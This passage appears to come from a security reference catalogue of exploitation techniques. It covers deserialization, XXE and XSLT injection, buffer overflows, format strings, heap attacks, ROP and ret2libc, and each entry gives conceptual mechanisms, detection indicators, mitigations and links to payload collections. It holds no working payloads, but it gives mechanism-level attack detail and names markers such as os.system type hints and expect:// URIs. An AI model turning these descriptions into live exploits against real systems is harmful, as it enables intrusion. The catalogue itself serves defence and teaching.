Marshal.load on untrusted input is RCE: it rebuilds arbitrary objects and calls marshal_load/init_with hooks. Luke Jahnke's elttam research showed a 'universal' gadget chain using only Ruby stdlib classes, requiring no application-specific gadgets, later extended to newer Ruby versions.

**How it works —** The attacker serializes an object graph of stdlib classes so that instance-variable restoration and callback methods chain into a code-execution primitive (ultimately a Kernel-level command/eval sink) purely from classes present in any Ruby install. Conceptual only; version-specific chains exist for Ruby 2.x through 3.4.

**Where —** Marshal.load over cookies/sessions, caches (Rails default cache/cookie stores historically), message payloads; also reachable indirectly via YAML.load, CSV, and Oj which can invoke Marshal semantics.

**Detection indicators:**
- Marshal magic bytes 0x04 0x08 (format version 4.8)
- Base64 Marshal payloads beginning 'BAh'
- Instance-variable markers ':@' and class-name tokens in the blob
- Rails cookie/session values decoding to Marshal streams

**References:** [link](https://github.com/j4k0m/Ruby2.x-RCE-Deserialization) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md) · [link](https://www.elttam.com/blog/ruby-deserialization) · [link](https://nastystereo.com/security/ruby-3.4-deserialization.html)

### PHP Object Injection via unserialize() (POP Chains, phpggc)
*id:* `php-object-injection-pop-chains` · *severity:* **high** · *languages:* php · *CVE:* CVE-2015-8562, CVE-2018-19274, CVE-2016-4010

Calling unserialize() on attacker-controlled data instantiates arbitrary application objects with attacker-chosen properties; PHP then auto-invokes magic methods (__wakeup, __destruct, __toString, __call) which can be chained across framework classes (a POP chain) into file writes, SQL, or code execution.

**How it works —** The attacker crafts a serialized object string naming an in-scope class and setting its properties so that a magic method fired during/after unserialization reaches a dangerous sink, hopping through intermediate 'gadget' classes. phpggc packages ready-made POP chains for Laravel, Symfony, WordPress/Monolog, Guzzle, Doctrine, etc. Conceptual only; no payloads reproduced.

**Where —** unserialize()/maybe_unserialize() on cookies, hidden form fields, cache/session data, API bodies, or any user-influenced serialized blob, in apps whose loaded classes contain exploitable magic methods.

**Detection indicators:**
- Serialized-object prefix O:<len>:"ClassName": (e.g. O:8:"stdClass":)
- Serializable custom format C:<len>:"ClassName":
- Array markers a:<n>:{...}, nested s:/i:/b: tokens
- Base64-wrapped variants decoding to the above
- __PHP_Incomplete_Class / references to Monolog, Guzzle, Laravel gadget classes

**References:** [link](https://github.com/ambionics/phpggc) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md) · [link](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP/) · [link](https://patchstack.com/academy/wordpress/vulnerabilities/php-object-injection/)

### PHP phar:// Stream Wrapper Deserialization
*id:* `php-phar-deserialization` · *severity:* **high** · *languages:* php · *CVE:* CVE-2019-6339, CVE-2018-1000888, CVE-2019-11043

Any filesystem function called on a phar:// path automatically unserializes the Phar archive's metadata, so an attacker who can control a file path (even indirectly, via an uploaded polyglot image) can trigger PHP object injection without any explicit unserialize() call. Disclosed by Sam Thomas at Black Hat 2018.

**How it works —** The attacker plants a Phar whose serialized metadata is a malicious object graph, disguised as a benign file (e.g. JPEG/GIF polyglot to pass upload filters). Triggering a file operation (file_exists, fopen, getimagesize, etc.) through the phar:// wrapper on that file causes the metadata to be unserialized, firing __wakeup/__destruct and any available POP chain. Conceptual only.

**Where —** Sinks passing user-influenced paths to filesystem functions supporting stream wrappers, combined with a file-upload or file-write primitive; classic in CMSes (Drupal, TYPO3, WordPress, SuiteCRM).

**Detection indicators:**
- Files beginning with '<?php __HALT_COMPILER();' (Phar stub)
- Phar signature 'GBMB' near end of file
- phar:// URIs appearing in file-path parameters
- Uploaded polyglots: valid image magic bytes (FFD8FF / GIF89a) followed by a Phar manifest
- Serialized-object tokens (O:, a:) embedded inside uploaded 'image' files

**References:** [link](https://github.com/ambionics/phpggc) · [link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html) · [link](https://www.sonarsource.com/blog/new-php-exploitation-technique/) · [link](https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/)

### Python jsonpickle Deserialization RCE
*id:* `python-jsonpickle-rce` · *severity:* **high** · *languages:* python · *CVE:* CVE-2020-22083

jsonpickle.decode() reconstructs arbitrary Python types encoded in JSON, including invoking constructors and __reduce__-style callables, so untrusted JSON passed to it can execute arbitrary code much like pickle.

**How it works —** The attacker crafts JSON containing jsonpickle's type-encoding keys naming a callable/class and its arguments; on decode, jsonpickle imports and instantiates or calls them, reaching a command-execution sink. Conceptual only.

**Where —** APIs/services that persist or exchange objects via jsonpickle.encode/decode and then decode attacker-controlled JSON.

**Detection indicators:**
- JSON keys 'py/object', 'py/type', 'py/reduce'
- JSON keys 'py/newargs', 'py/newargsex', 'py/function', 'py/repr'
- Dotted module/class paths (e.g. os.system, subprocess.check_output) as values of those keys

**References:** [link](https://www.sourcery.ai/vulnerabilities/python-jsonpickle-deserialization-rce) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md) · [link](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/Python/) · [link](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

### Ruby Oj Object Mode / YAML.load Type Instantiation
*id:* `ruby-oj-yaml-object-mode` · *severity:* **high** · *languages:* ruby · *CVE:* CVE-2022-32224

Oj in its default :object mode (and Ruby's YAML.load / Psych with tags) reconstructs arbitrary Ruby objects from type hints in the document, so untrusted JSON/YAML can instantiate gadget classes and reach code execution, mirroring Marshal-based chains.

**How it works —** The attacker embeds Ruby type tags (Oj '^o'/'^c' keys or YAML !ruby/object tags) naming classes whose initialization/instance-variable hooks feed a gadget chain into a command or method-invocation sink. Oj was hardened toward compat/safe modes; YAML.load was later made to require safe_load semantics. Conceptual only.

**Where —** Services using Oj.load in :object mode or Psych/YAML.load on untrusted input; APIs assuming JSON/YAML are inherently safe.

**Detection indicators:**
- Oj object-mode keys '^o' (object) and '^c' (class), plus 'json_class'
- YAML tags '!ruby/object:', '!ruby/hash:', '!ruby/struct:'
- Ruby class paths (e.g. Gem::Requirement, Net::*) appearing as type hints

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md) · [link](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/) · [link](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/) · [link](https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/)


## Interpreter / parser level (`interpreter-level`)

### WebAssembly / Rust Sandbox & Memory-Safety Edge Cases
*id:* `wasm-rust-memory-escape` · *severity:* **high** · *languages:* webassembly, rust, c, c++ · *CVE:* CVE-2021-32629, CVE-2023-26489

WebAssembly contains but does not eliminate memory bugs: C/C++ compiled to Wasm keeps its overflows/UAF inside linear memory, and true host escapes come from JIT/runtime miscompilations or type-confusion bugs in engines like Wasmtime (largely safe Rust, but logic errors still bite).

**How it works —** Wasm's linear-memory model isolates modules from the host but offers no bounds checking within a module's own memory, so memory-unsafe source languages remain exploitable for in-sandbox corruption that can pivot to host functions via imported capabilities (WASI path handling, host references). Host-level sandbox escapes historically stem from JIT/compiler logic bugs (Cranelift/Lucet-Wasmtime type confusion) or bounds-check/externref regressions rather than from unsafe application code. Rust's guarantees reduce but do not remove these logic-error risks. Conceptual only.

**Where —** Server-side/plugin Wasm runtimes (Wasmtime, Wasmer, Lucet) executing untrusted modules, and browser/edge platforms running attacker-supplied Wasm with host imports.

**Detection indicators:**
- Untrusted Wasm modules executed with broad WASI/host imports
- Outdated Wasmtime/Wasmer/Lucet versions with known miscompilation CVEs
- Modules probing WASI path translation or externref/table boundaries
- In-module memory corruption of C/C++-compiled Wasm reachable from input

**References:** [link](https://bytecodealliance.org/articles/security-and-correctness-in-wasmtime) · [link](https://docs.wasmtime.dev/security.html) · [link](https://www.cs.cmu.edu/~csd-phd-blog/2023/provably-safe-sandboxing-wasm/) · [link](https://nvd.nist.gov/vuln/detail/CVE-2023-26489)

### XML External Entity (XXE) Injection
*id:* `xml-xxe` · *severity:* **high** · *languages:* xml, java, php, .net, python · *CVE:* CVE-2018-1000840, CVE-2019-9670

XML parsers that resolve external/DTD entities let an attacker define entities pointing at local files or internal URLs, yielding file disclosure, SSRF, blind out-of-band exfiltration, and sometimes RCE (e.g. PHP expect://).

**How it works —** A crafted DOCTYPE declares external entities whose references, when the document is parsed with external-entity resolution enabled, are replaced by file contents (file://) or fetched URLs (http://), enabling local file read and SSRF; parameter entities plus an attacker DTD enable blind out-of-band exfiltration; billion-laughs entity expansion causes DoS. Impact varies by parser/language. Fix: disable external entities/DTDs. Conceptual only.

**Where —** SOAP/REST XML endpoints, SVG/DOCX/XLSX and other XML-backed uploads, SAML, and any service parsing user XML with a default-configured parser.

**Detection indicators:**
- DOCTYPE/ENTITY declarations in submitted XML
- file://, http://, php://, or expect:// URIs inside entity definitions
- Out-of-band DNS/HTTP callbacks from a blind XXE probe
- Parser errors leaking referenced file contents or fetch results

**References:** [link](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) · [link](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

### XSLT Server-Side Injection to RCE
*id:* `xslt-injection-rce` · *severity:* **high** · *languages:* xml, xslt, java, php, .net · *CVE:* CVE-2021-30560

When an attacker supplies or injects into an XSLT stylesheet processed server-side, processor extension functions and document primitives enable file read, SSRF, XXE, and remote code execution, with the exact primitive depending on the XSLT engine.

**How it works —** XSLT processors expose powerful features: libxslt/lxml document() and exsl:document (read/write), Saxon unparsed-text() and Java/C# extension bindings, Xalan Java extension namespaces, and .NET msxsl:script — each can be abused when transformation input or the stylesheet itself is attacker-controlled, leading to disclosure or command execution. Version banners are often readable via system-property(). Conceptual only.

**Where —** Reporting/document-generation, XML-to-HTML rendering, and integration pipelines that accept user-supplied XSL or transform attacker-influenced XML.

**Detection indicators:**
- User input reaching a stylesheet/transformer parameter
- xsl:stylesheet, document(), or extension-namespace declarations in input
- Version leakage via system-property('xsl:vendor')/('xsl:version')
- Processor-specific extension calls (php:function, msxsl:script, java: namespaces)

**References:** [link](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md) · [link](https://ine.com/blog/xslt-injections-for-dummies)


## Memory corruption (`memory-corruption`)

### Double-Free
*id:* `double-free` · *severity:* **critical** · *languages:* asm-x64, c, c++ · *CVE:* CVE-2017-2636, CVE-2019-15239

Freeing the same chunk twice corrupts allocator free-list bookkeeping so that malloc can return the same memory for two live allocations, giving overlapping objects and, ultimately, an arbitrary-write primitive.

**How it works —** Calling free() twice on one pointer inserts the chunk into a free list (tcache/fastbin) two times. A subsequent sequence of mallocs hands the same address out repeatedly; by writing to one alias the attacker forges the metadata of the other, classically overwriting a free-chunk fd (forward pointer) so a later malloc returns an attacker-chosen address (arbitrary allocation). glibc added a fastbin 'double free or corruption' check and a tcache key/counter to catch the naive case, which exploitation reference material then shows must be sidestepped conceptually. Described in terms of free-list link fields, not weaponized.

**Where —** C/C++ manual memory management, error/cleanup paths that free on multiple exits, kernel drivers, refcount underflow.

**Detection indicators:**
- glibc abort 'double free or corruption (fasttop)' or 'free(): double free detected in tcache 2'
- ASAN 'double-free (attempting double-free)' report
- Two live pointers observed aliasing the same address
- Mitigations: tcache double-free key, fastbin top check, safe-linking pointer mangling, quarantines

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/57/8)

### Format-String Vulnerability
*id:* `format-string-vulnerability` · *severity:* **critical** · *languages:* asm-x64, asm-x86, c · *CVE:* CVE-2000-0573, CVE-2012-0809, CVE-2015-8617

Passing attacker-controlled data as the format argument to printf-family functions lets the attacker read arbitrary stack/memory (%x/%s/%p) and write to chosen addresses (%n).

**How it works —** When user input reaches the format parameter (e.g. printf(user) instead of printf("%s", user)), each conversion specifier consumes an argument the caller never supplied, so the function walks the stack/register save area. Read primitives: %p/%x leak stack words (useful for canary and ASLR defeat), %s dereferences a stack pointer to leak memory at an address the attacker can also stage via positional args. Write primitive: %n stores the number of bytes printed so far to a pointed-at address; width specifiers (%100c) control the count, and short/byte length modifiers (%hn/%hhn) plus positional selectors ($) let the attacker write a full pointer in staged chunks. Conceptually it is an arbitrary-read/arbitrary-write engine driven purely by the format specification; described without any working format string.

**Where —** C code logging or echoing untrusted input through printf/fprintf/sprintf/syslog/err with a variable format argument.

**Detection indicators:**
- Compiler -Wformat-security / -Wformat-nonliteral warnings
- Unexpected hex/pointer output when input contains %x or %p
- SIGSEGV inside vfprintf on %n or %s dereference
- Mitigations: FORTIFY_SOURCE restricts %n in writable format strings, RELRO makes GOT read-only, non-constant-format compiler diagnostics

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://pwn.college/program-security/program-security/) · [link](https://phrack.org/issues/59/7) · [link](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)

### Stack-based Buffer Overflow
*id:* `stack-buffer-overflow` · *severity:* **critical** · *languages:* asm-x86, asm-x64, asm-arm, asm-arm64, c, c++ · *CVE:* CVE-2018-16865, CVE-2017-13089, CVE-2021-3156

An unbounded write into a stack buffer overwrites adjacent stack data — including the saved frame pointer and saved return address — allowing control-flow redirection when the function returns.

**How it works —** At the assembler level the prologue reserves a frame (e.g. sub rsp, N) with the saved return address at a fixed offset above the local buffer (conceptually [rbp+8] on x86-64, the LR slot on ARM). An unchecked copy such as gets/strcpy/memcpy with attacker-controlled length writes toward higher addresses, clobbering saved RBP and the return address; the ret pops the attacker-chosen value into RIP/PC. Conceptually the work is measuring the offset (padding) from buffer start to the saved return slot, then placing a target address there. Modern targets are ROP chains or libc addresses rather than on-stack code because of NX. Reference-level only — understanding requires stack-frame geometry, not payload bytes.

**Where —** C/C++ using unbounded copies (gets, strcpy, sprintf, scanf %s), fixed-size stack buffers, network daemons, setuid binaries, embedded/RTOS firmware.

**Detection indicators:**
- SIGSEGV with RIP/PC equal to an attacker pattern (e.g. 0x4141414141414141) or a non-executable address
- *** stack smashing detected *** abort from __stack_chk_fail (canary tripped)
- AddressSanitizer 'stack-buffer-overflow' report
- Mitigations that stop/raise the bar: stack canaries (SSP/-fstack-protector-strong), NX/DEP, ASLR/PIE, FORTIFY_SOURCE

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://ctf101.org/binary-exploitation/buffer-overflow/) · [link](https://pwn.college/program-security/program-security/) · [link](https://azeria-labs.com/stack-overflow-arm32/) · [link](https://phrack.org/issues/49/14)

### Type Confusion
*id:* `type-confusion` · *severity:* **critical** · *languages:* asm-x64, c++ · *CVE:* CVE-2021-30632, CVE-2018-4233, CVE-2017-11292

Code treats a memory object as a type different from its actual type, so fields, lengths, or a vtable/tag are interpreted incorrectly — turning attacker-controlled data into pointers or sizes.

**How it works —** When a downcast, union misuse, JIT type-speculation, or deserialization assigns the wrong type to an object, the program reads an attacker-controlled field at an offset the real type never defined. A common shape: a value the attacker controls is interpreted as an object pointer or as a vtable, so an indirect virtual call jumps to an attacker-influenced address; or a scalar is read as a length, producing OOB access. In JS engines this appears as JIT eliding a type guard, letting a double be reinterpreted as an object pointer (addrof/fakeobj primitives). The confusion is a logic/typing flaw whose effect is memory corruption; presented conceptually with object-layout reasoning only.

**Where —** C++ RTTI/downcasts and unions, JavaScript/JIT engines (V8, JSC, SpiderMonkey), Flash/ActionScript, language runtimes, IPC/serialization boundaries.

**Detection indicators:**
- Crash calling through a vtable that does not match the object
- UBSan -fsanitize=vptr / CFI 'control flow integrity check failed'
- Engine-specific type-guard assertion failures
- Mitigations: forward-edge CFI, pointer authentication, JIT hardening, RTTI validation, isolated heaps per type

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://dl.acm.org/doi/10.1145/1102120.1102165)

### Use-After-Free (UAF)
*id:* `use-after-free` · *severity:* **critical** · *languages:* asm-x64, c, c++ · *CVE:* CVE-2016-0728, CVE-2021-22555, CVE-2020-0041

A pointer is dereferenced after its object is freed; if the attacker reallocates that memory with controlled contents, the stale pointer operates on attacker data — commonly hijacking a virtual-call vtable or function pointer.

**How it works —** After free(), the chunk returns to the allocator's free list but the dangling pointer still references it. The attacker races/grooms a same-size allocation into the freed slot (heap Feng Shui) so their bytes occupy the object. When the program later uses the stale pointer — reading a C++ vtable pointer at object+0 and doing an indirect call through it, or invoking a stored callback — control or data flow is redirected. Reference counting bugs, error paths that free without nulling, and object lifetime mismatches are typical roots. Explained at the level of allocator free-lists and vtable dispatch (call [rax] through a controlled vtable), not with exploit code.

**Where —** C++ object-oriented code with virtual dispatch, browser DOM/JS engines, kernel objects with refcounts, event/callback systems, iterator invalidation.

**Detection indicators:**
- ASAN 'heap-use-after-free' with alloc/free/use stack traces
- Indirect call/jump through a pointer read from freed memory
- Non-deterministic crashes tied to allocation timing or GC
- Mitigations: MTE, GWP-ASan, delayed/quarantine free (hardened_malloc), type-isolated heaps (PartitionAlloc/kalloc_type), CFI on indirect calls

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://github.com/shellphish/how2heap) · [link](https://research.checkpoint.com/2020/safe-linking-eliminating-a-seemingly-harmless-bug/)

### Integer Overflow / Conversion Errors
*id:* `integer-overflow` · *severity:* **high** · *languages:* asm-x64, asm-x86, c, c++ · *CVE:* CVE-2018-4407, CVE-2021-3177, CVE-2002-0639

Arithmetic that wraps, truncates, or mishandles signedness produces a small or negative size that is then used for allocation or bounds checks, yielding an undersized buffer and a downstream overflow.

**How it works —** Fixed-width machine integers wrap modulo 2^n. A size computation like count * elem_size can wrap to a tiny value so malloc returns a small buffer while the loop copies the full count, overflowing it. Signed/unsigned confusion turns a negative length into a huge unsigned value passed to memcpy, or bypasses a signed 'len < max' check that is then used as unsigned. Truncation from 64-bit to 32-bit (or int to short) drops high bits. At the assembler level these are mul/imul overflow into the high register, movsx/movzx sign vs zero extension, and comparisons using jl vs jb. The integer bug is usually the root cause; the memory-corruption overflow is the effect. Conceptual only.

**Where —** Length/size arithmetic before allocation or copy, image/media/font parsers, allocators, protocol length fields, array index math.

**Detection indicators:**
- UBSan 'signed integer overflow' / 'implicit conversion' reports
- Allocation far smaller than the subsequent copy length
- Crash on a copy whose size derives from multiplication or subtraction of attacker values
- Mitigations: -ftrapv/-fsanitize=integer, calloc overflow checks, __builtin_mul_overflow guards

**References:** [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/60/10)

### Off-by-One / Null-Byte Poisoning
*id:* `off-by-one-null-byte-poisoning` · *severity:* **high** · *languages:* asm-x64, asm-x86, c, c++ · *CVE:* CVE-2019-11043, CVE-2016-2828

A single out-of-bounds byte (often a terminating NUL) corrupts one byte of adjacent metadata — a length, a chunk size field, or a low pointer byte — which is enough to pivot into a larger primitive.

**How it works —** Off-by-one bugs arise from boundary math errors (<= vs <, writing str[len] as a NUL after a full copy). On the heap, a one-byte overflow into the next chunk's size field (the 'poison null byte' / off-by-one against glibc malloc metadata) can clear the PREV_INUSE bit or shrink/extend the reported size, causing malloc to later create overlapping chunks that alias live allocations. Conceptually the attacker grooms allocations so the single controllable byte lands on a size field, then leverages the resulting overlap to overwrite a pointer or function target. On the stack a single-byte overwrite of a saved base pointer enables 'stack pivoting' via frame-pointer overwrite. Explained at the level of metadata layout, no exploit code.

**Where —** Heap allocators (glibc malloc chunk headers), string handling that appends a terminator, parsers computing buffer sizes, length-prefixed protocol code.

**Detection indicators:**
- Heap corruption aborts: 'malloc(): invalid size', 'corrupted size vs. prev_size', 'free(): invalid next size'
- ASAN 'heap-buffer-overflow' of size 1
- Crashes only under specific allocation orderings (grooming-dependent)
- Mitigations: glibc size-vs-prev_size sanity checks, tcache key checks, safe-linking, ASAN/hardened_malloc

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/57/9)

### ROP — Return-Oriented Programming
*id:* `rop-return-oriented-programming` · *severity:* **high** · *languages:* asm, c

Code-reuse exploitation that chains short existing instruction sequences ('gadgets') ending in ret to perform arbitrary, Turing-complete computation without injecting code, bypassing W^X/DEP/NX. Variants include JOP (jmp/call-based) and ret2libc; automation ('ROP-as-a-service') is provided by gadget-finding and chain-building tools.

**How it works —** conceptual — no working exploit

**Where —** Binaries with a stack/control-flow overwrite and non-executable data. Mitigated (partially) by ASLR, stack canaries, CFI/CET shadow stacks, and pointer authentication.

**Detection indicators:**
- stack filled with many addresses pointing just after ret gadgets in .text/libc
- control flow returning to non-call-preceded addresses (CET IBT/shadow-stack faults)
- abnormal density of short gadget executions
- stack-pivot sequences (xchg/mov rsp) prior to a chain

**References:** [link](https://github.com/JonathanSalwan/ROPgadget) · [link](https://github.com/sashs/Ropper) · [link](https://hovav.net/ucsd/dist/geometry.pdf) · [link](https://dl.acm.org/doi/10.1145/1315245.1315313)

### Shellcoding Concepts (Egghunters, Alphanumeric, Multi-Architecture)
*id:* `shellcoding-concepts` · *severity:* **high** · *languages:* asm-x86, asm-x64, asm-arm, asm-arm64

Reference to the constraints and design ideas of position-independent payloads across architectures — including egghunters for tiny buffers and encoded/alphanumeric payloads for character-restricted inputs — described conceptually, with no shellcode bytes.

**How it works —** Shellcode is position-independent machine code invoked after control-flow hijack. Reference concepts (not code): (1) Egghunters — when the injectable buffer is too small, a compact stub scans process virtual memory for a rare 8-byte 'egg' tag marking a larger payload staged elsewhere, using a syscall (access/sigaction on Linux, NtAccessCheckAndAuditAlarm on Windows) to test page validity without faulting on unmapped memory (skape, 'Safely Searching Process Virtual Address Space'). (2) Alphanumeric/printable and bad-char-free encoding — when input filters reject NUL/newline/non-printable bytes, payloads are constructed from a restricted opcode set or wrapped in a small decoder stub that reconstructs the real payload at runtime; ASCII-only x86 encoders are a classic study. (3) Architecture differences — x86/x64 use int 0x80/syscall and register-based args; ARM (Thumb interworking, no-NUL constraints) and ARM64 use svc with syscall number in a register, and cache coherency (flushing I-cache after writing code) matters. pwn.college's shellcode module and Azeria's ARM material teach these safely. Concepts and constraints only.

**Where —** Post-hijack code execution on executable memory (or after mprotect/mark-executable via ROP); relevant to constrained-input, size-limited, or cross-architecture targets.

**Detection indicators:**
- A short memory-scanning loop probing pages via a validity syscall (egghunter signature)
- Restricted-charset input that still achieves execution (encoder/decoder stub present)
- Payloads calling execve/execveat or spawning a shell
- Mitigations: NX/DEP (payload cannot execute without ROP), W^X, seccomp syscall filtering, egg/tag entropy detection, CFI on the initial hijack

**References:** [link](https://pwn.college/program-security/program-security/) · [link](https://azeria-labs.com/writing-arm-assembly-part-1/) · [link](https://github.com/guyinatuxedo/nightmare) · [link](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

### SROP — Sigreturn-Oriented Programming
*id:* `srop-sigreturn-oriented-programming` · *severity:* **high** · *languages:* asm, c

Abusing the UNIX signal-return mechanism: a fake signal frame placed on the stack plus a call to sigreturn lets the attacker set every CPU register (including RIP/RSP) at once from memory. This portable, near-gadgetless primitive turns a single controlled stack into arbitrary register state, enabling syscalls or chaining even with minimal gadgets.

**How it works —** conceptual — no working exploit

**Where —** UNIX/Linux binaries where a stack-control primitive exists and a sigreturn syscall gadget is reachable; especially useful against static binaries or when classic ROP gadgets are scarce.

**Detection indicators:**
- execution of rt_sigreturn without a preceding delivered signal
- stack contents matching a forged sigcontext/ucontext layout
- unexpected full register reload followed by a syscall instruction
- control flow entering the vDSO/libc sigreturn trampoline out of context

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://docs.pwntools.com/en/stable/rop/srop.html) · [link](https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf) · [link](https://www.semanticscholar.org/paper/Framing-Signals-A-Return-to-Portable-Shellcode-Bosman-Bos/dbbd80d75e097e25ddbdc610e73ef197b617bb33)

### TOCTOU Races & Symlink/Hardlink Attacks
*id:* `toctou-symlink-race` · *severity:* **high** · *languages:* c, bash · *CVE:* CVE-2019-3462, CVE-2021-4034

Time-of-check-to-time-of-use bugs exploit the gap between a privileged program validating a path/resource and using it. An attacker races to swap a file for a symlink/hardlink (or wins an insecure temp-file or /proc race) so the privileged process reads or writes an unintended, sensitive target.

**How it works —** conceptual — no working exploit

**Where —** setuid/root programs, installers, and daemons operating on attacker-writable directories (/tmp, shared dirs) without O_NOFOLLOW/openat2 RESOLVE flags; hardlinks defeat ownership checks lacking protected_hardlinks.

**Detection indicators:**
- symlinks appearing mid-operation in world-writable directories
- predictable temp-file names (mktemp misuse) opened without O_EXCL
- privileged writes following an attacker's path/inode swap
- high-frequency rename/link/unlink loops racing a privileged process

**References:** [link](https://github.com/xairy/linux-kernel-exploitation) · [link](https://cseclab.nu/static/media/pubs/2004_race.pdf) · [link](https://www.usenix.org/legacy/event/usenix05/tech/general/full_papers/borisov/borisov.pdf)


## Heap exploitation (`heap-exploitation`)

### glibc tcache Poisoning
*id:* `tcache-poisoning` · *severity:* **critical** · *languages:* asm-x64, c

Overwriting the next (fd) pointer of a chunk sitting in a tcache bin makes malloc return an attacker-chosen address on a subsequent allocation, giving a near-arbitrary write.

**How it works —** The per-thread cache (tcache, glibc >= 2.26) is a singly linked LIFO of freed chunks keyed by size, with minimal integrity checks. If a use-after-free or overflow lets the attacker corrupt the fd field of a cached chunk, the next two allocations of that size return first the corrupted chunk and then the forged target address; the attacker then writes there (e.g. onto __free_hook/__malloc_hook historically, or a GOT/target structure). glibc 2.32 added 'safe-linking', which XORs fd with (chunk_addr >> 12), so reference material notes the attacker must know/leak the heap base to forge a valid mangled pointer, plus an alignment check. Conceptual walk of bin structure only; how2heap hosts the canonical demonstrations.

**Where —** glibc-based Linux heaps (>= 2.26) with a UAF/overflow/double-free that reaches tcache fd fields; ubiquitous in CTF pwn.

**Detection indicators:**
- malloc returning an address outside any heap region
- 'malloc(): unaligned tcache chunk detected' (2.32+ alignment guard)
- Heap-base leak observed prior to the write (safe-linking prerequisite)
- Mitigations: safe-linking fd mangling, tcache alignment check, removal of __free_hook/__malloc_hook in glibc 2.34+

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://research.checkpoint.com/2020/safe-linking-eliminating-a-seemingly-harmless-bug/)

### Fastbin Dup
*id:* `fastbin-dup` · *severity:* **high** · *languages:* asm-x64, c

Abusing a double-free in a fastbin so the same chunk appears twice in the singly linked bin, letting the attacker later steer an allocation to a crafted address (classically 'fastbin dup into stack').

**How it works —** Fastbins are per-size LIFO singly linked lists. glibc only checks that the chunk being freed is not identical to the current bin head (the 'fasttop' check), so freeing A, then B, then A again evades it and puts A in the bin twice. Reallocating returns A, then B, then A while A is still 'in use'; by overwriting A's fd the attacker inserts a fake chunk whose address they control (must satisfy the size-field check, hence 'into_stack' variants placing a matching fake size near the target). The related fastbin_dup_consolidate abuses malloc_consolidate to bypass the check. Presented via free-list link semantics; no exploit code.

**Where —** glibc heaps using fastbins (small allocations), programs with double-free or controlled free ordering.

**Detection indicators:**
- 'double free or corruption (fasttop)' when the head check trips
- 'malloc(): memory corruption (fast)' size mismatch on the forged chunk
- Allocation returning a stack/BSS address
- Mitigations: fastbin size sanity check, tcache interposing (tcache filled first), safe-linking

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/66/10)

### Unsorted-Bin Attack and House-of-* Family
*id:* `unsorted-bin-attack` · *severity:* **high** · *languages:* asm-x64, c

Corrupting the doubly linked unsorted-bin metadata writes the address of the bin (a libc pointer) into an attacker-chosen location, a primitive underpinning many House-of-* techniques.

**How it works —** When a chunk leaves the unsorted bin, glibc's partial unlink writes the bin head address into the bk->fd slot of a neighbor. If the attacker corrupts a free chunk's bk to point at (target - 0x10), the unlink writes a large libc value into target — useful to overwrite a size/counter (e.g. global_max_fast) to unlock further primitives. This is one member of a family of allocator-abuse patterns catalogued as House of Force (top-chunk size overwrite for arbitrary-distance allocation, removed in 2.29), House of Spirit (freeing a fake chunk), House of Einherjar (off-by-one prev_size to backward-consolidate), House of Orange (top chunk + _IO_FILE), House of Lore (smallbin bk), and Large-Bin Attack. Reference-level descriptions of metadata unlinking only.

**Where —** glibc heaps where an overflow/UAF can corrupt free-chunk fd/bk or the top chunk; classic CTF heap challenges.

**Detection indicators:**
- 'malloc(): corrupted unsorted chunks' / 'unsorted double linked list corrupted'
- A libc-range value appearing at an unexpected writable address
- Crashes tied to specific alloc/free grooming sequences
- Mitigations: unsorted-bin fd/bk consistency checks, House of Force removal (glibc 2.29), top-chunk size check, safe-linking (tcache/fastbin)

**References:** [link](https://github.com/shellphish/how2heap) · [link](https://github.com/guyinatuxedo/nightmare) · [link](https://phrack.org/issues/67/8) · [link](https://phrack.org/issues/66/10)


## Code-reuse (ROP/JOP/ret2*) (`code-reuse`)

### Return-to-libc (ret2libc)
*id:* `ret2libc` · *severity:* **critical** · *languages:* asm-x64, asm-x86, c

Instead of injecting code, the return address is set to an existing libc function (e.g. system) with attacker-arranged arguments, achieving execution while defeating a non-executable stack.

**How it works —** The oldest code-reuse technique: overwrite the saved return address with the address of a libc routine such as system(), and arrange the stack (32-bit) or argument registers (64-bit, via pop gadgets) so the call receives an attacker-controlled argument like a pointer to the string "/bin/sh" (present in libc). A follow-on return slot can chain to exit() for a clean finish. Because it calls a legitimate library function it needs neither injected code nor (before ASLR) any leak. Under ASLR the attacker must first leak a libc address; ret2csu and ret2dlresolve are refinements for setting up arguments or resolving symbols. Described at the calling-convention level, no payload.

